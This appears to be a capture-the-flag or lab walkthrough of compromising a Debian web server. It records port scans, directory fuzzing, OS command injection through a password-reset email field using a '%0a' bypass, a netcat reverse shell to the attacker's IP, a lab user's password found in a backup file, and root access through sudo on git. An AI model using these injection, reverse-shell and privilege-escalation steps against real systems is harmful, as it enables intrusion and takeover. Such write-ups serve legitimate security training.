> Noamro08 - 8 Feb 2024

### Target: 192.168.184.109

---
## Enumeration

nmap scan - default scripts, services, top-1000-ports:
```bash
nmap -Pn -n -A 192.168.184.109 -oN initial.scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-08 15:24 IST
Nmap scan report for 192.168.184.109
Host is up (0.076s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: AdminLTE 3 | Dashboard
|_http-server-header: Apache/2.4.38 (Debian)
| http-git: 
|   192.168.184.109:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|       https://github.com/ColorlibHQ/AdminLTE.git
|_    Project type: Ruby on Rails web application (guessed from .gitignore)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      32936/udp   mountd
|   100005  1,2,3      41849/tcp6  mountd
|   100005  1,2,3      41985/udp6  mountd
|   100005  1,2,3      54505/tcp   mountd
|   100021  1,3,4      34331/udp6  nlockmgr
|   100021  1,3,4      41473/tcp   nlockmgr
|   100021  1,3,4      46067/tcp6  nlockmgr
|   100021  1,3,4      56514/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs     3-4 (RPC #100003)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

full ports:
```bash
nmap -Pn -n -p- 192.168.184.109 -oN all.ports --min-rate=5000 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-08 15:55 IST
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 39.79% done; ETC: 15:55 (0:00:11 remaining)
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 85.63% done; ETC: 15:55 (0:00:02 remaining)
Nmap scan report for 192.168.184.109
Host is up (0.075s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
41473/tcp open  unknown
45259/tcp open  unknown
49415/tcp open  unknown
54505/tcp open  unknown
```

fuzzing dirs with ffuf:
```bash
ffuf -u http://192.168.184.109/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.184.109/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

docs                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 73ms]
pages                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 74ms]
demo                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 73ms]
plugins                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 73ms]
db                      [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 76ms]
dist                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 77ms]
build                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 71ms]
LICENSE                 [Status: 200, Size: 1082, Words: 155, Lines: 21, Duration: 74ms]
under_construction      [Status: 301, Size: 331, Words: 20, Lines: 10, Duration: 74ms]

```

navigating in the main site, nothing interesting was found, checking '/under_construction' directory seems to be login page that needs an email, we can see in the source code of the forgot password page (/under_construction/forgot.php), that 'sendmail.php' "must receive the variable from the html form and send the message"
and that this file does not exist:
![[Pasted image 20240208162031.png]]

also the page says `By clicking "Reset Password" we will send a password reset link`
![[Pasted image 20240208161926.png]]

The behavior of the page reveals that the code is executing commands by passing an argument to the **sendmail.php** page, which does not exist.

## OS command injection

setting up burpsuite and testing this 'reset password' button with test@test.com we can see the body of the captured request contains `email=test%40email.com`. This seems like a good candidate for command injection. Let's include the variable `email` in a GET request and inject `;` followed by the command `id`:
![[Pasted image 20240208163202.png]]
it  doesnt work.

searching online for os command injection bypasses we found this article from [hacktricks](https://book.hacktricks.xyz/pentesting-web/command-injection) which recommend using `%0a`:
![[Pasted image 20240208163424.png]]
it works! we have OS command injection.

## initial foothold

now setting up nc listener on port 80 and try to get rev shell:
using the command `nc -c bash 192.168.45.249 80`:
![[Pasted image 20240208163817.png]]
we got a reverse shell.

upgrading the shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@UC404:/var/www/html/under_construction$ export TERM=xterm
CTRL ^Z
---
# kali
stty size                                                    
47 189
stty raw -echo; fg
----
# target rev shell
stty rows 47 columns 189
```
<center>fully upgraded shell!</center>

<font color="#92d050">local.txt:</font>
![[Pasted image 20240208164653.png]]

## Privesc:

executing linpeas. sh:
we can see suspicious backup file `/var/backups/sendmail.php.bak`:
in the file we can see the credentials for the user `brian`:
![[Pasted image 20240208170651.png]]
<font color="#92d050">brian: BrianIsOnTheAir789</font>


trying to ssh:
```bash
(kali㉿kali)-[/opt/linux]
└─$ ssh brian@192.168.184.109
```
it works!

checking sudoers file we can see:
```bash
brian@UC404:~$ sudo -l
Matching Defaults entries for brian on UC404:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User brian may run the following commands on UC404:
    (ALL) NOPASSWD: /usr/bin/git
```

brian can run git with sudo privileges, from [gtfobins](https://gtfobins.github.io/gtfobins/git/#sudo) we can see there is a way tyo privesc:
```bash
sudo git -p help config
!/bin/sh
```

![[Pasted image 20240208171404.png]]
